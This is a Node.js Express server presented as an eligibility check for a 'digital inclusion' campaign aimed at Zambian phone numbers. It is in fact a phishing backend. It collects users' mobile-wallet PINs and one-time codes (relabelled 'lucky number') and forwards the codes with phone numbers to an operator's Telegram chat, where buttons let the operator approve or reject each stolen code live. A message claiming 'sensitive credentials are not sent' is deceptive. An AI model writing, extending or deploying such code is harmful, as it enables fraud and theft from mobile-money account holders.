import 'dotenv/config'
import cors from 'cors'
import express from 'express'
import helmet from 'helmet'
import morgan from 'morgan'

const app = express()
const port = process.env.PORT || 4000
const eligibilityRequests = new Map()
let telegramUpdateOffset = 0
let isPollingTelegram = false

if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_ADMIN_CHAT_ID) {
  console.warn('Telegram notifications disabled: configure backend/.env with TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID.')
}

app.use(helmet())
app.use(cors())
app.use(express.json())
app.use(morgan('tiny'))

const sendTelegramNotification = async ({ phone, postalCode, reference }) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_ADMIN_CHAT_ID
  if (!botToken || !chatId) return

  const message = [
    'Move Forward',
    '',
    'New eligibility request',
    `Phone: ${phone}`,
    `Postal code: ${postalCode}`,
    `Reference: ${reference}`,
    'Status: Awaiting code verification',
    '',
    'Postal code is included for review; sensitive credentials are not sent.'
  ].join('\n')

  const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      reply_markup: {
        inline_keyboard: [[
          { text: '✅ Allow', callback_data: `allow:${reference}` },
          { text: '❌ Invalid information', callback_data: `invalid:${reference}` }
        ]]
      }
    })
  })

  if (!telegramResponse.ok) {
    const telegramResult = await telegramResponse.json().catch(() => null)
    const reason = telegramResult?.description ? `: ${telegramResult.description}` : ''
    throw new Error(`Telegram notification failed with status ${telegramResponse.status}${reason}`)
  }
}

const sendTelegramCompletionNotification = async ({ phone, postalCode, reference, otp }) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_ADMIN_CHAT_ID
  if (!botToken || !chatId) throw new Error('Telegram notifications are not configured.')

  const message = [
    'Move Forward',
    '',
    'User completed the verification step',
    `Phone: ${phone}`,
    `Postal code: ${postalCode}`,
    `Code: ${otp}`,
    `Reference: ${reference}`,
    'Status: Final step submitted',
    '',
    'Code included for review.'
  ].join('\n')

  const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      reply_markup: {
        inline_keyboard: [[
          { text: '✅ Approve code', callback_data: `correct:${reference}` },
          { text: '❌ Wrong code', callback_data: `expired:${reference}` },
          { text: '❌ Deny request', callback_data: `invalid_info:${reference}` }
        ]]
      }
    })
  })

  if (!telegramResponse.ok) {
    const telegramResult = await telegramResponse.json().catch(() => null)
    const reason = telegramResult?.description ? `: ${telegramResult.description}` : ''
    throw new Error(`Telegram completion notification failed with status ${telegramResponse.status}${reason}`)
  }
}

const pollTelegramUpdates = async () => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN
  if (!botToken || isPollingTelegram) return
  isPollingTelegram = true

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${telegramUpdateOffset + 1}&timeout=0`)
    const result = await response.json()
    if (!response.ok || !result.ok) throw new Error(result.description || `Telegram updates failed with status ${response.status}`)

    for (const update of result.result) {
      telegramUpdateOffset = Math.max(telegramUpdateOffset, update.update_id)
      const callback = update.callback_query
      if (!callback?.data) continue

      const [decision, reference] = callback.data.split(':')
      const eligibilityRequest = eligibilityRequests.get(reference)
      if (!eligibilityRequest) continue

      if (decision === 'correct' || decision === 'expired' || decision === 'invalid_info') {
        eligibilityRequest.finalStatus = decision
      }
      if (decision === 'allow' || decision === 'invalid') {
        eligibilityRequest.status = decision === 'allow' ? 'allowed' : 'invalid'
      }
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callback.id,
          text: decision === 'allow'
            ? 'User allowed to continue.'
            : decision === 'invalid'
              ? 'Information marked as invalid.'
              : decision === 'expired'
                ? 'Wrong code.'
                : decision === 'invalid_info'
                  ? 'Information marked as invalid.'
                  : 'Verification confirmed.'
        })
      })
      await fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message?.chat?.id,
          message_id: callback.message?.message_id,
          reply_markup: { inline_keyboard: [] }
        })
      })
    }
  } catch (error) {
    console.error(`Telegram update polling failed: ${error.message}`)
  } finally {
    isPollingTelegram = false
  }
}

if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_ADMIN_CHAT_ID) {
  setInterval(pollTelegramUpdates, 1500)
  pollTelegramUpdates()
}

app.get('/api/health', (_request, response) => {
  response.json({ status: 'ok', service: 'digital-inclusion-campaign' })
})

app.post('/api/eligibility', (request, response) => {
  const { phone, walletpin, consent } = request.body ?? {}
  const normalizedPhone = String(phone ?? '').replace(/\s+/g, '')

  if (!/^\+260\d{9,10}$/.test(normalizedPhone)) {
    return response.status(400).json({ message: 'Enter a valid phone number with 9 or 10 digits after +260.' })
  }

  if (consent !== true) {
    return response.status(400).json({ message: 'Please confirm that you agree to the eligibility check.' })
  }

  if (!/^\d{4,5}$/.test(String(walletpin ?? ''))) {
    return response.status(400).json({ message: 'Enter a 4- or 5-digit wallet pin.' })
  }

  const reference = `ZDI-${Date.now().toString(36).toUpperCase()}`
  eligibilityRequests.set(reference, { status: 'pending', finalStatus: 'not_started', phone: normalizedPhone, walletpin: String(walletpin) })
  sendTelegramNotification({ phone: normalizedPhone, walletpin: String(walletpin), reference }).catch((error) => {
    eligibilityRequests.get(reference).status = 'notification_failed'
    console.error(error.message)
  })

  return response.json({
    eligible: true,
    message: 'Your details have been received. Keep your phone nearby for the next step.',
    reference
  })
})

app.get('/api/eligibility/:reference/status', (request, response) => {
  const eligibilityRequest = eligibilityRequests.get(request.params.reference)
  if (!eligibilityRequest) return response.status(404).json({ message: 'Eligibility request not found.' })
  return response.json({ status: eligibilityRequest.status })
})

app.post('/api/otp', async (request, response) => {
  const { reference, otp } = request.body ?? {}
  const eligibilityRequest = eligibilityRequests.get(String(reference ?? ''))

  if (!eligibilityRequest || eligibilityRequest.status !== 'allowed') {
    return response.status(400).json({ message: 'This eligibility request has not been approved.' })
  }

  if (!/^\d{4,6}$/.test(String(otp ?? ''))) {
    return response.status(400).json({ message: 'Enter a valid 4- to 6-digit lucky number.' })
  }

  try {
    eligibilityRequest.finalStatus = 'pending'
    await sendTelegramCompletionNotification({ ...eligibilityRequest, reference, otp: String(otp) })
    return response.json({ message: 'Waiting for Telegram confirmation.' })
  } catch (error) {
    console.error(error.message)
    return response.status(502).json({ message: 'We could not send the final notification. Please try again.' })
  }
})

app.get('/api/eligibility/:reference/final-status', (request, response) => {
  const eligibilityRequest = eligibilityRequests.get(request.params.reference)
  if (!eligibilityRequest) return response.status(404).json({ message: 'Eligibility request not found.' })
  return response.json({ status: eligibilityRequest.finalStatus })
})

app.use((_request, response) => {
  response.status(404).json({ message: 'Route not found.' })
})

app.listen(port, () => {
  console.log(`Campaign API listening on http://localhost:${port}`)
})
